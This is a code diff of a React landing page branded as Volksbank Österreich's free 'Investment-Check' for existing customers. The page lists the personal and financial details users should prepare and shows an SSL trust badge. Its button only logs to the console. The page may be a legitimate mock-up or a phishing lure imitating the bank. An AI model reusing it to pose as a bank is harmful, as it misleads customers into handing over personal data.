@@ -1,255 +1,262 @@
 import { useEffect } from "react";
-import { usePageMeta } from "@/hooks/use-page-meta";
-import { ArrowRight, Check, Info } from "lucide-react";
+import {
+  User, Calendar, MapPin, Mail, Phone, Map, TrendingUp, Target,
+  FileEdit, ShieldCheck, CalendarClock, MessageSquare,
+  UserCheck, Landmark, Home, Wallet,
+  ArrowRight, Lock, Info, Clock, Gift,
+} from "lucide-react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankIcon from "@/assets/volksbank.png";
-import heroImg from "@/assets/investmentcheck-hero.jpg";
-import teaser1 from "@/assets/investmentcheck-teaser-1.jpg";
-import teaser2 from "@/assets/investmentcheck-teaser-2.jpg";
-import teaser3 from "@/assets/investmentcheck-teaser-3.jpg";
+import heroImage from "@/assets/investmentcheck-hero.jpg";
+import { usePageMeta } from "@/hooks/use-page-meta";
 
-const NAVY = "#003882";
-const NAVY_DARK = "#002356";
-const TEXT = "#333333";
-const MUTED_BG = "#f5f7fa";
+const VB_NAVY = "#003882";
+const JAHR = "2026";
+
+type IconType = React.ComponentType<React.SVGProps<SVGSVGElement>>;
+
+const SectionHeading = ({ children, kicker }: { children: React.ReactNode; kicker?: string }) => (
+  <div className="text-center mb-8">
+    {kicker && (
+      <div className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2" style={{ color: VB_NAVY }}>
+        {kicker}
+      </div>
+    )}
+    <h2 className="text-2xl md:text-[28px] font-semibold text-gray-900 leading-tight">{children}</h2>
+    <div className="w-10 h-[3px] mx-auto rounded-full mt-4" style={{ backgroundColor: VB_NAVY }} />
+  </div>
+);
+
+const InfoItem = ({
+  Icon, title, text,
+}: { Icon: IconType; title: string; text: string }) => (
+  <div className="bg-white border border-gray-200 rounded-xl p-5 text-left flex gap-4 items-start shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300">
+    <div
+      className="shrink-0 w-9 h-9 rounded-md flex items-center justify-center border"
+      style={{ backgroundColor: "rgba(0,56,130,0.06)", borderColor: "rgba(0,56,130,0.2)" }}
+    >
+      <Icon className="w-[18px] h-[18px]" style={{ color: VB_NAVY }} strokeWidth={2} />
+    </div>
+    <div className="min-w-0">
+      <h3
+        className="text-[13px] font-normal uppercase tracking-wider mb-1 leading-tight"
+        style={{ color: VB_NAVY }}
+      >
+        {title}
+      </h3>
+      <p className="text-[13.5px] text-gray-600 leading-relaxed">{text}</p>
+    </div>
+  </div>
+);
 
 const InvestmentCheck = () => {
   useEffect(() => { window.scrollTo(0, 0); }, []);
   usePageMeta("Volksbank Investment-Check für Bestandskunden", volksbankIcon);
 
-  const handleStart = () => {
+  const handleCta = () => {
     console.log("Investment-Check gestartet");
   };
 
+  const voraussetzungen: { Icon: IconType; title: string; text: string }[] = [
+    { Icon: UserCheck, title: "Bestandskunde", text: "Aktives Konto bei der Volksbank Österreich" },
+    { Icon: Home, title: "Wohnsitz", text: "Hauptwohnsitz in Österreich" },
+    { Icon: Calendar, title: "Alter", text: "Mindestalter 18 Jahre" },
+    { Icon: Landmark, title: "Anlageinteresse", text: "Vorhandenes Erspartes oder Anlagevermögen" },
+  ];
+
+  const schritte: { Icon: IconType; title: string; text: string }[] = [
+    { Icon: FileEdit, title: "Angaben machen", text: "Kurze Fragen zu Ihrer Anlagesituation" },
+    { Icon: ShieldCheck, title: "Auswertung", text: "Persönliche Analyse durch Volksbank-Experten" },
+    { Icon: CalendarClock, title: "Terminvorschlag", text: "Sie erhalten passende Termine" },
+    { Icon: MessageSquare, title: "Beratung", text: "Persönliches Gespräch, unverbindlich" },
+  ];
+
+  const angaben: { Icon: IconType; title: string; text: string }[] = [
+    { Icon: User, title: "Name", text: "Vollständiger Vor- und Nachname" },
+    { Icon: Calendar, title: "Geburtsdatum", text: "Tag, Monat und Jahr (TT.MM.JJJJ)" },
+    { Icon: MapPin, title: "Adresse", text: "Straße, Hausnummer, optional Stiege und Tür" },
+    { Icon: Map, title: "PLZ und Ort", text: "Postleitzahl und Ort" },
+    { Icon: Mail, title: "E-Mail", text: "Für Rückfragen und Bestätigung" },
+    { Icon: Phone, title: "Telefon", text: "Telefonnummer für Erreichbarkeit" },
+    { Icon: TrendingUp, title: "Aktuelle Anlagen", text: "Grobe Übersicht Ihres Vermögens" },
+    { Icon: Target, title: "Anlageziel", text: "Ihre Wünsche und Anlagehorizont" },
+  ];
+
+  const CtaButton = () => (
+    <button
+      type="button"
+      onClick={handleCta}
+      className="inline-flex items-center gap-2 text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors hover:brightness-110"
+      style={{ backgroundColor: VB_NAVY }}
+    >
+      <span>Jetzt Investment-Check starten</span>
+      <ArrowRight className="w-4 h-4" />
+    </button>
+  );
+
   return (
-    <div className="min-h-screen flex flex-col bg-white" style={{ color: TEXT, fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
+    <div className="min-h-screen bg-gray-50 text-gray-900" style={{ fontFamily: "'Open Sans', system-ui, sans-serif" }}>
       {/* Header */}
-      <header className="bg-white border-b border-slate-200">
-        <div className="max-w-[1440px] mx-auto flex items-center justify-between px-6 py-4">
-          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-12" />
-          <span className="hidden sm:inline text-xs uppercase tracking-widest font-semibold" style={{ color: NAVY }}>
-            Investment-Check
-          </span>
+      <header className="bg-white border-b border-gray-200">
+        <div className="container mx-auto flex items-center justify-center px-4 py-5">
+          <span className="sr-only">Volksbank</span>
+          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-11" />
         </div>
+        <div className="h-[3px] w-full" style={{ backgroundColor: VB_NAVY }} />
       </header>
 
-      {/* Hero — full bleed image with overlay text */}
-      <section className="relative w-full overflow-hidden" style={{ height: "min(70vh, 720px)", minHeight: 480 }}>
-        <img
-          src={heroImg}
-          alt="Volksbank Investment Beratung"
-          width={1920}
-          height={1080}
-          className="absolute inset-0 w-full h-full object-cover"
-        />
+      {/* Hero */}
+      <section className="relative overflow-hidden border-b border-gray-200 bg-white">
         <div
-          className="absolute inset-0"
-          style={{
-            background:
-              "linear-gradient(to top, rgba(0,20,50,0.75) 0%, rgba(0,20,50,0.25) 45%, rgba(0,20,50,0) 70%)",
-          }}
+          className="absolute inset-0 bg-cover bg-center"
+          style={{ backgroundImage: `url(${heroImage})`, opacity: 0.5 }}
+          aria-hidden="true"
         />
-        <div className="relative h-full max-w-[1440px] mx-auto px-6 flex flex-col justify-end pb-12 md:pb-20">
-          <h1
-            className="text-white font-bold tracking-tight leading-[0.95]"
-            style={{ fontSize: "clamp(2.5rem, 6vw, 5.5rem)" }}
-          >
-            Der Volksbank<br />Investment-Check
+        <div className="absolute inset-0 bg-gradient-to-b from-white/50 via-white/60 to-gray-50/90" aria-hidden="true" />
+        <div className="relative container mx-auto px-4 py-14 md:py-16 text-center max-w-3xl">
+          <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-4" style={{ color: VB_NAVY }}>
+            <span className="inline-block w-1.5 h-1.5 rounded-full" style={{ backgroundColor: VB_NAVY }} />
+            Exklusiv für Bestandskunden · Volksbank
+          </div>
+          <h1 className="text-3xl md:text-5xl font-semibold mb-5 tracking-tight text-gray-900 leading-[1.1]">
+            Investment-Check {JAHR}
           </h1>
-          <p className="mt-6 text-white/90 max-w-2xl text-lg md:text-xl leading-relaxed">
-            Für Bestandskunden: Prüfen Sie in 3 Minuten, ob Ihr Erspartes wirklich für Sie arbeitet.
+          <p className="text-[15px] md:text-base text-gray-700 mb-8 max-w-xl mx-auto leading-relaxed">
+            Prüfen Sie in wenigen Minuten, ob Ihr Erspartes wirklich für Sie arbeitet. Der{" "}
+            <span className="font-semibold" style={{ color: VB_NAVY }}>Volksbank Investment-Check</span>{" "}
+            ist kostenlos und unverbindlich.
           </p>
-        </div>
-      </section>
 
-      {/* CTA link directly below hero */}
-      <section className="border-b border-slate-200">
-        <div className="max-w-[1440px] mx-auto px-6 py-6 flex flex-wrap items-center gap-6">
-          <button
-            onClick={handleStart}
-            className="group inline-flex items-center gap-3 font-semibold text-base transition-colors"
-            style={{ color: NAVY }}
-          >
-            <span
-              className="inline-flex items-center justify-center w-10 h-10 rounded-full transition-transform group-hover:translate-x-1"
-              style={{ backgroundColor: NAVY, color: "#fff" }}
-            >
-              <ArrowRight className="w-5 h-5" />
-            </span>
-            Jetzt Investment-Check starten
-          </button>
-          <span className="text-sm text-slate-500">Dauer: ca. 3 Minuten · exklusiv für Bestandskunden</span>
-        </div>
-      </section>
-
-      {/* Intro block */}
-      <section className="py-16 md:py-24">
-        <div className="max-w-[1440px] mx-auto px-6">
-          <div className="max-w-[780px]">
-            <p className="text-xs uppercase tracking-[0.2em] font-semibold mb-5" style={{ color: NAVY }}>
-              Der persönliche Anlage-Check
-            </p>
-            <h2 className="font-bold tracking-tight leading-tight" style={{ color: NAVY_DARK, fontSize: "clamp(1.75rem, 3.5vw, 2.75rem)" }}>
-              Wann haben Sie zuletzt Ihre Geldanlage überprüft?
-            </h2>
-            <div className="mt-8 space-y-5 text-lg leading-relaxed">
-              <p>
-                Zinssituation, Inflation und Märkte verändern sich laufend. Damit Ihr Vermögen
-                optimal für Sie arbeitet, lohnt sich regelmäßig ein professioneller Blick auf
-                Ihre Anlagen.
-              </p>
-              <p>
-                Mit dem Volksbank Investment-Check erhalten Sie als Bestandskunde eine kostenlose
-                Ersteinschätzung — persönlich, unabhängig und diskret. In wenigen Minuten
-                sehen Sie, welche Chancen in Ihrer aktuellen Situation stecken.
-              </p>
-              <p className="text-base text-slate-500 italic">
-                Hinweis: Veranlagungen können mit Wertschwankungen verbunden sein.
-              </p>
+          <div className="grid grid-cols-2 gap-3 max-w-md mx-auto mb-8">
+            <div className="bg-white border border-gray-200 rounded-xl px-4 py-3 text-left shadow-md transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-gray-300 flex items-center gap-3">
+              <Clock className="w-8 h-8 shrink-0" style={{ color: VB_NAVY }} strokeWidth={1.5} aria-hidden="true" />
+              <div>
+                <div className="text-[10.5px] font-bold uppercase tracking-wider mb-0.5" style={{ color: VB_NAVY }}>Dauer</div>
+                <div className="text-xl font-semibold text-gray-900">ca. 3 Min.</div>
+              </div>
             </div>
+            <div className="bg-white border border-gray-200 rounded-xl px-4 py-3 text-left shadow-md transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:border-gray-300 flex items-center gap-3">
+              <Gift className="w-8 h-8 shrink-0" style={{ color: VB_NAVY }} strokeWidth={1.5} aria-hidden="true" />
+              <div>
+                <div className="text-[10.5px] font-bold uppercase tracking-wider mb-0.5" style={{ color: VB_NAVY }}>Kosten</div>
+                <div className="text-xl font-semibold text-gray-900">kostenlos</div>
+              </div>
+            </div>
+          </div>
+
+          <CtaButton />
+          <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-gray-500">
+            <Lock className="w-3.5 h-3.5" />
+            <span>SSL-verschlüsselt · volksbank.at</span>
           </div>
         </div>
       </section>
 
-      {/* Teaser cards */}
-      <section className="pb-16 md:pb-24">
-        <div className="max-w-[1440px] mx-auto px-6">
-          <p className="text-xs uppercase tracking-[0.2em] font-semibold mb-3" style={{ color: NAVY }}>
-            Was Sie erwartet
-          </p>
-          <h2 className="font-bold tracking-tight mb-10" style={{ color: NAVY_DARK, fontSize: "clamp(1.5rem, 2.8vw, 2.25rem)" }}>
-            Ihr Weg zum Investment-Check
-          </h2>
+      <main className="py-12 md:py-14 space-y-14">
+        {/* Was ist der Investment-Check */}
+        <section className="container mx-auto px-4 max-w-3xl">
+          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm transition-all duration-200 hover:shadow-md hover:border-gray-300">
+            <div className="h-1" style={{ backgroundColor: VB_NAVY }} />
+            <div className="p-8 md:p-10 text-center">
+              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: VB_NAVY }}>
+                <Info className="w-3.5 h-3.5" />
+                Information
+              </div>
+              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
+                Was ist der Volksbank Investment-Check?
+              </h2>
+              <div className="text-gray-600 text-[14.5px] max-w-xl mx-auto leading-relaxed space-y-1">
+                <p>Der Investment-Check ist eine kostenlose Ersteinschätzung Ihrer Anlagesituation.</p>
+                <p>Exklusiv für Volksbank-Bestandskunden — persönlich, unabhängig und diskret.</p>
+              </div>
+            </div>
+          </div>
+        </section>
 
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-            {[
-              {
-                img: teaser1,
-                title: "Individuelle Auswertung",
-                text: "Wir analysieren Ihre aktuelle Anlagesituation und zeigen konkrete Optimierungspotenziale — zugeschnitten auf Ihre Lebensphase.",
-              },
-              {
-                img: teaser2,
-                title: "Persönliche Beratung",
-                text: "Ihre Volksbank-Experten begleiten Sie mit einer ehrlichen Einschätzung und beantworten alle offenen Fragen.",
-              },
-              {
-                img: teaser3,
-                title: "In 3 Minuten erledigt",
-                text: "Kein Papierkram, keine langen Termine. Der Check startet direkt online — jederzeit abbrechbar.",
-              },
-            ].map((c) => (
-              <article key={c.title} className="group flex flex-col">
-                <div className="relative overflow-hidden mb-6" style={{ aspectRatio: "4/3" }}>
-                  <img
-                    src={c.img}
-                    alt={c.title}
-                    width={720}
-                    height={540}
-                    loading="lazy"
-                    className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
-                  />
-                </div>
-                <h3 className="text-xl md:text-2xl font-bold mb-3" style={{ color: NAVY_DARK }}>
-                  {c.title}
-                </h3>
-                <p className="text-slate-700 leading-relaxed mb-5 flex-1">{c.text}</p>
-                <button
-                  onClick={handleStart}
-                  className="inline-flex items-center gap-2 text-sm font-semibold self-start border-b border-transparent hover:border-current pb-0.5 transition-colors"
-                  style={{ color: NAVY }}
-                >
-                  Mehr erfahren
-                  <ArrowRight className="w-4 h-4" />
-                </button>
-              </article>
+        {/* Voraussetzungen - 2x2 */}
+        <section className="container mx-auto px-4 max-w-5xl">
+          <SectionHeading kicker="Teilnahme">Voraussetzungen</SectionHeading>
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+            {voraussetzungen.map((v) => (
+              <InfoItem key={v.title} Icon={v.Icon} title={v.title} text={v.text} />
             ))}
           </div>
-        </div>
-      </section>
+        </section>
 
-      {/* Vorteile / Was Sie erwartet — Two columns */}
-      <section className="py-16 md:py-20 border-t border-slate-200">
-        <div className="max-w-[1440px] mx-auto px-6">
-          <div className="max-w-[780px] mb-12">
-            <p className="text-xs uppercase tracking-[0.2em] font-semibold mb-3" style={{ color: NAVY }}>
-              Vorteile & Rahmen
-            </p>
-            <h2 className="font-bold tracking-tight leading-tight" style={{ color: NAVY_DARK, fontSize: "clamp(1.5rem, 2.8vw, 2.25rem)" }}>
-              Klare Vorteile für Bestandskunden
-            </h2>
+        {/* So funktioniert's */}
+        <section className="container mx-auto px-4 max-w-5xl">
+          <SectionHeading kicker="Ablauf">So funktioniert&apos;s</SectionHeading>
+          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
+            {schritte.map((s, i) => (
+              <div
+                key={s.title}
+                className="bg-white border border-gray-200 rounded-xl p-5 text-center shadow-sm transition-all duration-200 hover:-translate-y-0.5 hover:shadow-md hover:border-gray-300"
+              >
+                <span
+                  className="mx-auto mb-3 w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold bg-white"
+                  style={{ border: `1px solid ${VB_NAVY}`, color: VB_NAVY }}
+                >
+                  {i + 1}
+                </span>
+                <h3 className="text-[15px] font-semibold text-gray-900 mb-1 leading-tight">{s.title}</h3>
+                <p className="text-[13.5px] text-gray-600 leading-relaxed">{s.text}</p>
+              </div>
+            ))}
           </div>
+        </section>
 
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 md:gap-16">
-            <div>
-              <h3 className="text-lg font-bold mb-6 pb-3 border-b" style={{ color: NAVY_DARK, borderColor: NAVY }}>
-                Ihre Vorteile
-              </h3>
-              <ul className="space-y-4">
-                {[
-                  "Kostenlos und unverbindlich",
-                  "Individuelle Auswertung Ihrer Anlagesituation",
-                  "Persönliche Empfehlungen von Ihren Volksbank-Experten",
-                  "Exklusiv für Volksbank-Bestandskunden",
-                ].map((t) => (
-                  <li key={t} className="flex items-start gap-3">
-                    <Check className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: NAVY }} />
-                    <span className="leading-relaxed">{t}</span>
-                  </li>
-                ))}
-              </ul>
-            </div>
-            <div>
-              <h3 className="text-lg font-bold mb-6 pb-3 border-b border-slate-300" style={{ color: NAVY_DARK }}>
-                Was Sie wissen sollten
-              </h3>
-              <ul className="space-y-4">
-                {[
-                  "Der Check dauert ca. 3 Minuten und ist jederzeit abbrechbar.",
-                  "Die Auswertung dient als erste Orientierung, ersetzt keine vollständige Beratung.",
-                  "Ihre Angaben werden vertraulich behandelt und nur zur Vorbereitung Ihres Termins genutzt.",
-                  "Veranlagungen können mit Wertschwankungen und Verlusten verbunden sein.",
-                ].map((t) => (
-                  <li key={t} className="flex items-start gap-3">
-                    <Info className="w-5 h-5 mt-0.5 flex-shrink-0 text-slate-400" />
-                    <span className="leading-relaxed text-slate-700">{t}</span>
-                  </li>
-                ))}
-              </ul>
+        {/* Welche Angaben */}
+        <section className="container mx-auto px-4 max-w-5xl">
+          <SectionHeading kicker="Vorbereitung">Welche Angaben Sie benötigen</SectionHeading>
+          <p className="text-gray-600 text-[14.5px] leading-relaxed text-center max-w-xl mx-auto mb-8 -mt-2">
+            Halten Sie folgende Informationen bereit, bevor Sie den Check starten.
+          </p>
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+            {angaben.map((a) => (
+              <InfoItem key={a.title} Icon={a.Icon} title={a.title} text={a.text} />
+            ))}
+          </div>
+        </section>
+
+        {/* CTA-Box */}
+        <section className="container mx-auto px-4 max-w-3xl">
+          <div className="bg-white border border-gray-200 rounded-xl overflow-hidden shadow-sm transition-all duration-200 hover:shadow-md hover:border-gray-300">
+            <div className="h-1" style={{ backgroundColor: VB_NAVY }} />
+            <div className="p-8 md:p-10 text-center">
+              <div className="inline-flex items-center gap-2 text-[11px] font-semibold uppercase tracking-[0.18em] mb-3" style={{ color: VB_NAVY }}>
+                <Info className="w-3.5 h-3.5" />
+                Kundeninformation
+              </div>
+              <h2 className="text-xl md:text-2xl font-semibold text-gray-900 mb-3">
+                Bereit für Ihren Investment-Check?
+              </h2>
+              <div className="text-gray-600 text-[14.5px] mb-6 max-w-xl mx-auto leading-relaxed space-y-1">
+                <p>In wenigen Minuten erledigt.</p>
+                <p>Kostenlos, unverbindlich und exklusiv für Bestandskunden.</p>
+              </div>
+              <CtaButton />
+              <div className="flex items-center justify-center gap-2 mt-5 text-[12px] text-gray-500">
+                <Lock className="w-3.5 h-3.5" />
+                <span>SSL-verschlüsselt · Volksbank Österreich</span>
+              </div>
             </div>
           </div>
-        </div>
-      </section>
-
-      {/* Secondary CTA */}
-      <section className="py-16 md:py-24" style={{ backgroundColor: MUTED_BG }}>
-        <div className="max-w-[820px] mx-auto px-6 text-center">
-          <p className="text-xs uppercase tracking-[0.2em] font-semibold mb-4" style={{ color: NAVY }}>
-            Jetzt starten
-          </p>
-          <h2 className="font-bold tracking-tight leading-tight mb-5" style={{ color: NAVY_DARK, fontSize: "clamp(1.75rem, 3.5vw, 2.75rem)" }}>
-            Starten Sie Ihren persönlichen Investment-Check
-          </h2>
-          <p className="text-lg text-slate-700 mb-10 leading-relaxed">
-            Kostenlos, unverbindlich und exklusiv für Volksbank-Bestandskunden.
-          </p>
-          <button
-            onClick={handleStart}
-            className="inline-flex items-center gap-3 px-8 py-4 text-base font-semibold text-white transition-all hover:brightness-110 shadow-sm"
-            style={{ backgroundColor: NAVY }}
-          >
-            Jetzt Investment-Check starten
-            <ArrowRight className="w-5 h-5" />
-          </button>
-          <p className="mt-5 text-sm text-slate-500">Dauer: ca. 3 Minuten</p>
-        </div>
-      </section>
+        </section>
+      </main>
 
       {/* Footer */}
-      <footer className="bg-white border-t border-slate-200">
-        <div className="max-w-[1440px] mx-auto px-6 py-8 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-slate-500">
-          <span>© {new Date().getFullYear()} Volksbank. Alle Rechte vorbehalten.</span>
-          <span>Nur für Bestandskunden der Volksbank Österreich.</span>
+      <footer className="bg-white border-t border-gray-200">
+        <div className="h-[3px] w-full" style={{ backgroundColor: VB_NAVY }} />
+        <div className="container mx-auto px-4 py-8 text-center">
+          <nav className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-3 text-[13px]">
+            <a href="https://www.volksbank.at/zib/impressum.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors" style={{ color: undefined }}>Impressum</a>
+            <a href="https://www.volksbank.at/zib/datenschutz.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors">Datenschutz</a>
+            <a href="https://www.volksbank.at/zib/barrierefreiheit.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors">Barrierefreiheitserklärung</a>
+            <a href="https://www.volksbank.at/zib/kontakt.page" target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:underline transition-colors">Kontakt</a>
+          </nav>
+          <p className="text-[11.5px] text-gray-500">
+            © {JAHR} Volksbank Österreich · Nur für Bestandskunden
+          </p>
         </div>
       </footer>
     </div>
